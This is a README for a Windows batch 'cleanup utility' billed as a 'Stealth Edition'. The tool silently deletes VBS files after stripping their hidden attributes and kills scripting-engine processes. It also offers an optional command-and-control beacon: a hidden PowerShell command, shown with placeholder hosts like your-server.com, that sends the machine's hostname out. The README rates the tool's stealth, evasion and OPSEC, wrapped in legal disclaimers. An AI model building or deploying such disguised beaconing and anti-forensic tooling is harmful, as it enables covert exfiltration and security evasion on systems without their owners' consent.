```markdown
# Enhanced System Cleanup Utility (Stealth Edition)

![Batch Script](https://img.shields.io/badge/language-Batch-blue)
![System Utility](https://img.shields.io/badge/type-system_cleanup-green)
![Version](https://img.shields.io/badge/version-1.3_Stealth-orange)

## ⚠️ Advanced System Tool - Use With Extreme Caution
This script performs deep system cleanup operations with "stealth" characteristics. It combines legitimate maintenance tasks with features commonly seen in security research tools.

```plaintext
███████╗███╗   ██╗██╗  ██╗ ██████╗ ███████╗
██╔════╝████╗  ██║██║  ██║██╔════╝ ██╔════╝
█████╗  ██╔██╗ ██║███████║██║  ███╗█████╗  
██╔══╝  ██║╚██╗██║██╔══██║██║   ██║██╔══╝  
███████╗██║ ╚████║██║  ██║╚██████╔╝███████╗
╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
Stealth Edition v1.3
```

## 📌 Core Functionality

### 1. **VBScript Cleaner**
```bat
for %%F in ("%TARGET_TEMP_PATH%\*.vbs") do (
    attrib -s -h "%%F" >nul 2>&1
    del /f /q "%%F" >nul 2>&1
)
```
- Removes all VBS files from `C:\Windows\Temp`
- Strips system/hidden attributes before deletion
- Operates silently without user feedback

### 2. **Scripting Engine Terminator**
```bat
for %%P in (wscript.exe cscript.exe) do (...)
```
- Force-kills all running instances of:
  - `wscript.exe`
  - `cscript.exe`
- Uses WMIC for process termination (avoids standard taskkill)

### 3. **C2 Reporting Module (Optional)**
```bat
powershell -NoP -W Hidden -C "$u='!C2_PAYLOAD!'...
```
- When enabled, sends beacon to remote server
- Reports:
  - Hostname (`%COMPUTERNAME%`)
  - Script execution status
  - Custom identifier ("EClean")
- Uses PowerShell with hidden window

## ⚙️ Configuration Options
```bat
set "TARGET_TEMP_PATH=C:\Windows\Temp"   ; Cleanup directory
set "VBS_PATTERN=*.vbs"                 ; File targeting pattern
set "LOG_VERBOSE=false"                 ; Show operation details
set "C2_URL=http://your-server.com/report" ; Reporting endpoint
set "ENABLE_C2=false"                   ; Enable/disable C2 comms
```

## 🛡️ Security Features
- **Admin Check**: Fails gracefully without admin privileges
- **Stealth Operations**: 
  - No console output by default
  - Hidden PowerShell execution
  - WMIC instead of taskkill
- **Attribute Stripping**: Removes system/hidden flags before deletion

## 🔧 Usage
1. **Basic Cleanup**:
   ```cmd
   EnhancedCleanup.bat
   ```

2. **Verbose Mode** (Adds logging):
   ```bat
   set "LOG_VERBOSE=true"
   ```

3. **Enable Reporting**:
   ```bat
   set "ENABLE_C2=true"
   set "C2_URL=http://your-actual-endpoint.com"
   ```

## ⚠️ Critical Notes
1. **System Impact**:
   - Terminates running script processes (may disrupt legitimate operations)
   - Permanent deletion of VBS files (no recovery)

2. **Stealth Classification**:
   - Uses anti-forensics techniques (attribute stripping)
   - Hidden PowerShell execution
   - Security software may flag as suspicious

3. **C2 Communication**:
   - Only enable with explicit permission
   - Requires custom endpoint configuration
   - Transmits identifiable system information

## ⚖️ Legal Disclaimer
```plaintext
THIS TOOL IS FOR SECURITY RESEARCH AND AUTHORIZED SYSTEM ADMINISTRATION ONLY.
UNAUTHORIZED USE MAY VIOLATE:
- Computer Fraud and Abuse Act (CFAA)
- General Data Protection Regulation (GDPR)
- Local cybersecurity legislation

The author disclaims all liability for illegal or unethical use.
```

## 📊 Script Rating (Security Research Perspective)
| Category          | Score (1-10) | Notes                          |
|-------------------|--------------|--------------------------------|
| Stealth           | 8/10         | Hidden ops, WMIC, attrib strip |
| System Impact     | 6/10         | Targets specific file/process  |
| Evasion           | 7/10         | Avoids common detection vectors|
| Functionality     | 5/10         | Limited scope but effective    |
| OPSEC             | 4/10         | C2 uses plain HTTP             |
| **Overall**       | **6/10**     | Effective research tool        |

**Created by Donwell | Stealth Edition v1.3 | For Authorized Research Only**
```

> 🔐 **Ethical Notice**: This documentation assumes responsible use in controlled environments for security research purposes. Always obtain proper authorization before testing on any system.
